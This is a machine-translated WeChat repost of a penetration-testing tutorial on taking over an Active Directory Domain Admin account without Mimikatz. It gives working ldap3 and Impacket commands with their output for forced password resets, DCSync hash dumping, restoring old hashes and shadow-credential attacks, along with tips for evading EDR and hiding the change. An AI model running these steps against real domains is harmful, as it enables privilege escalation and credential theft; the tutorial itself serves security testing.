#  译文 | 在没有 Mimikatz 的情况下操作用户密码

原创 bggsec [ 甲方安全建设 ](javascript:void\(0\);)

**甲方安全建设** ![]()

微信号 blueteams

功能介绍 甲方安全建设的点滴，共同学习，一起进步。 笔耕不辍也是对自我的督促。

____

__

收录于话题 #域安全 21个

![](https://gitee.com/fuli009/images/raw/master/public/20220310170405.png)

开卷有益 · 不求甚解

![](https://gitee.com/fuli009/images/raw/master/public/20220310170406.png)  

## 前言

在渗透测试期间，您可能希望更改用户密码的常见原因有两个：

  1. 你有他们的 NT 哈希，但没有他们的明文密码。将他们的密码更改为已知的明文值可以让您访问不能选择 Pass-the-Hash 的服务。
  2. 您没有他们的 NT 哈希或明文密码，但您有权修改这些密码。这可以允许横向移动或特权升级。

通过利用 _Mimikatz_ _的_ _lsadump::setntlm_ 和 _lsadump::changentlm_
函数，过去已经涵盖了这两个用例。虽然 _Mimikatz_ 是最好的攻击工具之一，但我会尽量避免使用它，因为它是反病毒和 EDR
工具的高度目标。在这篇文章中，我将专门讨论用例 #2 — 为横向移动或权限提升重置密码。

考虑以下场景：

![](https://gitee.com/fuli009/images/raw/master/public/20220310170407.png)

BloodHound 攻击路径

您可以控制 n00py 用户帐户，该帐户有权重置 esteban_da 的密码，他是 Domain Admins 组的成员。

首先，我将使用 Windows 快速介绍这种攻击。要执行初始密码重置，您有几个选项：

  1. 内置的 _exe_ 二进制文件。我倾向于避免运行 net.exe，因为这通常是 EDR 的危险信号。
  2. PowerView的 _Set-DomainUserPassword_ 。这也有效，但是，如果可能的话，我希望避免导入任何 PowerShell 脚本。
  3. 内置的 _Set-ADAccountPassword_ PowerShell 命令行开关。这是我通常喜欢的一个。

![]()

使用 Set-ADAccountPassword 重置用户密码

通过这次重置，我们造成了一个潜在的问题。用户 esteban_da
将无法再登录，因为我们更改了他的密码，我们需要在它被发现之前将其改回来。由于我们现在可以控制 Domain Admins
组中的帐户，因此我们可以将其重新设置。

## 使用 Windows 重置密码

首要任务是恢复先前密码的 NT 哈希。最简单的方法是使用 _Mimikatz_ ，尽管我将介绍一些替代方案。

![](https://gitee.com/fuli009/images/raw/master/public/20220310170408.png)

使用 Mimikatz 恢复密码历史

另一种恢复方法是使用命令行工具恢复 NTDS.dit 数据库以及 SYSTEM 注册表配置单元。有很多方法可以做到这一点，但一种简单的方法是使用内置的
_ntdsutil_ 和命令。

![](https://gitee.com/fuli009/images/raw/master/public/20220310170409.png)

使用 ntdsutil 恢复 NTDS.dit

拥有这些文件后，可以将它们从系统中拉出以进行离线提取。

一旦离线， _Mimikatz_ 可以在不被发现的情况下使用，但也可以使用Michael _Grafnetter_ 的 DSInternals 进行恢复。

![](https://gitee.com/fuli009/images/raw/master/public/20220310170410.png)

使用 DSInternals 恢复密码历史记录

现在原始 NT 哈希已恢复，是时候重置它了。首先，使用 _Mimikatz_ ：

![](https://gitee.com/fuli009/images/raw/master/public/20220310170411.png)

使用 Mimikatz 设置 NT 哈希

这也可以使用 _DSInternals_ 和 _Set-SamAccountPasswordHash_ 来完成：

![](https://gitee.com/fuli009/images/raw/master/public/20220310170413.png)

使用 DSInternals 设置 NT 哈希

我喜欢 _DSInternals_ 具有双重用途，通常不被视为攻击性工具。它甚至可以直接从Microsoft PowerShell Gallery安装。

到目前为止，所有方法都需要使用 Windows，但是如果我们根本不想使用 Windows 怎么办？

## 使用 Linux 重置密码

也可以仅使用在 Linux 上运行的命令行工具复制此攻击链。

初始密码重置可以使用 python ldap3库通过 LDAP 完成。首先，我们使用 n00py 帐户绑定到 LDAP。然后我们对 esteban_da
执行密码重置。

    
    
    # python3  
    >>> import ldap3  
    >>> from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE  
    >>> user = 'n00py'  
    >>> password = 'PasswordForn00py'  
    >>> server = ldap3.Server('n00py.local',get_info = ldap3.ALL, port=636, use_ssl = True)  
    >>> c = Connection(server, user, password=password)  
    >>> c.bind()  
    True  
    >>> c.extend.microsoft.modify_password('CN=ESTEBAN DA,OU=EMPLOYEES,DC=N00PY,DC=LOCAL', 'NewPass123')  
    True  
    

 **通过 LDAP 重置密码**

重置密码后，我们就可以控制域管理员。然后可以使用带有*-just-dc-user _和_ -history标志的* _Impacket_ _的_
_secretsdump.py_ 对 esteban_da 帐户执行 DCSync 。

    
    
    # python3 impacket/examples/secretsdump.py esteban_da:NewPass123@n00py.local -just-dc-user esteban_da -history  
    Impacket v0.9.25.dev1+20220217.14948.9fee58da - Copyright 2021 SecureAuth Corporation  
       
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
    [*] Using the DRSUAPI method to get NTDS.DIT secrets  
    n00py.local\esteban_da:1119:aad3b435b51404eeaad3b435b51404ee:<CURRENT NTHASH>:::  
    n00py.local\esteban_da_history0:1119:<OLD NT HASH>:::  
    

 **使用 Impacket 转储密码历史**

一旦之前的 NT 哈希恢复，就可以使用 Impacket 中的 smbpasswd.py 将其 _设置**回来_ 。

注意：这不会绕过密码策略要求，因此您需要事先枚举，尤其是最短密码期限和密码历史记录。这可以使用 Windows 上的 **net accounts
/domain** 命令或使用CrackMapExec 中的 _–pass_ _-pol_
标志来完成。如果密码策略成为问题，您可能必须在妥协后对其进行修改。

    
    
    # python3 smbpasswd.py n00py.local/esteban_da:NewPass123@n00py.local  -newhashes aad3b435b51404eeaad3b435b51404ee:<OLD NT HASH>  
    Impacket v0.9.25.dev1+20220217.14948.9fee58da - Copyright 2021 SecureAuth Corporation  
       
    [*] NTLM hashes were changed successfully.  
    

 **使用 Impacket 重置 NT 哈希**

在撰写本文时，存在两 (2) 个对 _Impacket_ 的主动拉取请求。这些请求增加了通过直接修改域控制器上的 NTDS 来重置密码的能力，就像
_Mimikatz_ 所做的那样。这允许绕过密码策略，但需要域管理员级别的权限才能执行。

通过使用 Impacket PR #1172，我们可以使用另一个域管理员帐户并绕过密码历史记录将 esteban_da 重置回原始哈希值。

    
    
    # python3 smbpasswd.py n00py.local/administrator@n00py.local -hashes :<ADMINISTRATOR NT HASH> -reset esteban_da -newhashes :<ESTEBAN_DA NT HASH>  
    Impacket v0.9.24.dev1+20210929.201429.1c847042 - Copyright 2021 SecureAuth Corporation  
       
    [*] NTLM hashes were set successfully.  
    

 **使用 Impacket 重置 NT 哈希并绕过密码历史 PR#1172**

另一个需要注意的是，在将密码哈希设置回其原始值后，该帐户会被设置为已过期的密码。要清除此标志，我们可以将 LDAP 与从 DCSync
恢复的另一个域管理员帐户的 NT 哈希一起使用。

    
    
    # python3  
    >>> import ldap3  
    >>> from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE  
    >>> server = ldap3.Server('n00py.local',get_info = ldap3.ALL, port=636, use_ssl = True)  
    >>> user = 'n00py.local\\Administrator'  
    >>> password =’<LM HASH>:<NT HASH>’  
    >>> c = Connection(server, user, password=password, authentication=NTLM)  
    >>> c.bind()  
    True  
    >>> from ldap3 import MODIFY_ADD, MODIFY_REPLACE, MODIFY_DELETE  
    >>> changeUACattribute = {"PwdLastSet":  (MODIFY_REPLACE, ["-1"]) }  
    >>> c.modify('CN=ESTEBAN DA,OU=EMPLOYEES,DC=N00PY,DC=LOCAL', changes=changeUACattribute)  
    True  
    

 **删除过期密码属性**

然后将 esteban_da 帐户设置回其原始配置。

另一个 _Impacket_ PR #1171的工作方式大致相同，但语法略有不同。

    
    
    # python3 smbpasswd.py n00py.local/esteban_da:@n00py.local -newhashes :<ESTEBAN_DA NT HASH> -altuser n00py.local/administrator -althash <ADMINISTRATOR NT HASH> -admin  
       
    Impacket v0.9.24.dev1+20220226.11205.67342473 - Copyright 2021 SecureAuth Corporation  
       
       
    [*] Credentials were injected into SAM successfully.  
    

 **使用 Impacket 重置 NT 哈希并绕过密码历史 PR 1171**

##  奖励：影子凭证

我们是否需要重置 esteban_da 的密码才能控制它？答案实际上是否定的，我们没有。再一次，让我们看一下 _BloodHound_ 图：

![](https://gitee.com/fuli009/images/raw/master/public/20220310170407.png)

BloodHound 攻击路径

我们看到，我们不仅拥有重置密码的权限，而且还拥有 _GenericWrite_ 权限。但是，这是什么意思？如果我们查看 _BloodHound_
滥用信息，它会让我们知道我们也可以执行有针对性的 Kerberoast 攻击。

很好，但这仍然需要我们能够从 Kerberos 票证中恢复明文密码，除非用户密码较弱，否则这是不可能的。

此外， _BloodHound_ 提示并非包罗万象， _BloodHound_ 并不总是向您显示从一个 1
对象到另一个对象的每条可用边。这是因为某些边是隐式的，例如 _GenericAll_ ，这意味着您也有 _GenericWrite_ ，因此列出来是多余的。

如果我们要删除 _GenericWrite_ 并重新运行 _BloodHound_ 集合，我们会看到：

![](https://gitee.com/fuli009/images/raw/master/public/20220310170415.png)

额外的 BloodHound 边缘

我们现在看到了四 (4) 个我们以前没有看到的边缘。首先，让我们检查一下 _BloodHound_ 的滥用信息：

  *  **WriteDACL** ：这告诉我们可以添加 _GenericAll_ 权限，然后执行有针对性的 Kerberoast 攻击或强制密码重置。
  *  **AllExtendedRights** ：这让我们知道我们可以执行强制密码重置。
  *  **WriteOwner** ：这让我们知道我们可以更改对象的所有者并再次执行有针对性的 Kerberoast 攻击或强制密码重置。
  *  **AddKeyCredentialLink** ：在撰写此博客时，此边缘不存在帮助文本。

使用 _AddKeyCredentialLink_
权限，可以执行影子凭据攻击。虽然这种技术被认为是攻击者可以悄悄地在环境中持续存在的一种方式，但它对于特权升级也很有用，就像强制密码重置一样。

这使我们能够为用户恢复 Kerberos 票证并恢复他们的 NT 哈希，有效地充当单用户
DCSync。我不会详细介绍攻击的工作原理，因为这已经被广泛介绍了，但我将演示如何从 Windows 和 Linux 执行这种攻击。

## 来自 Windows 的影子凭证

可以使用Elad Shamir 的 _Whisker从 Windows 执行此攻击。_ 它使用起来非常简单，在添加 Shadow Credentials
后，它会输出证书和 _Rubeus_ 命令来恢复 Kerberos TGT 和 NT 哈希。

![](https://gitee.com/fuli009/images/raw/master/public/20220310170416.png)

使用 Whisker 添加影子凭证

![](https://gitee.com/fuli009/images/raw/master/public/20220310170417.png)

使用 Rubeus 获取 TGT 和 NT 哈希

## 来自 Linux 的影子凭证

在 Linux 中，我们可以使用Charlie Bromberg 的 _pyWhisker执行此攻击。_

    
    
     # python3 pywhisker.py -d "n00py.local" -u "n00py" -p "PasswordForn00py" --target "esteban_da" --action "add" --filename hax  
    [*] Searching for the target account  
    [*] Target user found: CN=esteban da,OU=Employees,DC=n00py,DC=local  
    [*] Generating certificate  
    [*] Certificate generated  
    [*] Generating KeyCredential  
    [*] KeyCredential generated with DeviceID: 02b2e9ef-d55f-60fe-bca9-f254249a49af  
    [*] Updating the msDS-KeyCredentialLink attribute of esteban_da  
    [+] Updated the msDS-KeyCredentialLink attribute of the target object  
    [+] Saved PFX (#PKCS12) certificate & key at path: hax.pfx  
    [*] Must be used with password: dfeiecA9SZN75zJ7P5Zs  
    [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools  
    

 **使用 pyWhisker 添加影子凭证**

一旦影子凭证就位，Kerberos TGT 和 NT 哈希就可以使用Dirk-jan Mollema的 PKINITtools 恢复。

    
    
    # python3 gettgtpkinit.py -cert-pfx hax.pfx -pfx-pass dfeiecA9SZN75zJ7P5Zs n00py.local/esteban_da esteban_da.ccache  
    2022-02-21 16:29:58,106 minikerberos INFO     Loading certificate and key from file  
    2022-02-21 16:29:58,125 minikerberos INFO     Requesting TGT  
    2022-02-21 16:29:58,148 minikerberos INFO     AS-REP encryption key (you might need this later):  
    2022-02-21 16:29:58,148 minikerberos INFO     571d3d9f833365b54bd311a906a63d95da107a8e7457e8ef01b36810daadf243  
    2022-02-21 16:29:58,151 minikerberos INFO     Saved TGT to file  
       
    # python3 getnthash.py -key 571d3d9f833365b54bd311a906a63d95da107a8e7457e8ef01b36810daadf243 n00py.local/esteban_da  
    Impacket v0.9.25.dev1+20220217.14948.9fee58da - Copyright 2021 SecureAuth Corporation  
       
    [*] Using TGT from cache  
    [*] Requesting ticket to self with PAC  
    Recovered NT Hash  
    <NT HASH>  
    

 **使用 PKINITtools 获取 TGT 和 NT 哈希**

##  结束的想法

虽然其中一些主题之前已经介绍过，但拥有可用于实现相同目标的多种技术是很有价值的。每个环境都有其独特的限制，拥有更多可用选项会增加成功的可能性。

## 译文申明

  * 文章来源为`近期阅读文章`，质量尚可的，大部分较新，但也可能有老文章。
  * `开卷有益，不求甚解`，不需面面俱到，能学到一个小技巧就赚了。
  * `译文仅供参考`，具体内容表达以及含义,  _`以原文为准`_  (译文来自自动翻译)
  * 如英文不错的，`尽量阅读原文`。(点击原文跳转)
  * `每日早读`基本自动化发布(不定期删除)，这是`一项测试`

> > > ### `最新动态: Follow Me`
>>>

>>> 微信/微博： **`red4blue`**

>>>

>>> 公众号/知乎： **`blueteams`**

>>>

>>> ![](https://gitee.com/fuli009/images/raw/master/public/20220310170418.png)  
>

![](https://gitee.com/fuli009/images/raw/master/public/20220310170419.png)

  

![]()

bggsec

![赞赏二维码]() **微信扫一扫赞赏作者** __赞赏

已喜欢，[对作者说句悄悄话](javascript:;)

取消 __

#### 发送给作者

发送

最多40字，当前共字

[](javascript:;) 人赞赏

上一页 [1](javascript:;)/3 下一页

长按二维码向我转账

受苹果公司新规定影响，微信 iOS 版的赞赏功能被关闭，可通过二维码转账支持公众号。

预览时标签不可点

收录于话题 #

 个

上一篇 下一篇

阅读原文

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

译文 | 在没有 Mimikatz 的情况下操作用户密码

最多200字，当前共字

__

发送中

[写留言](javascript:;)

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

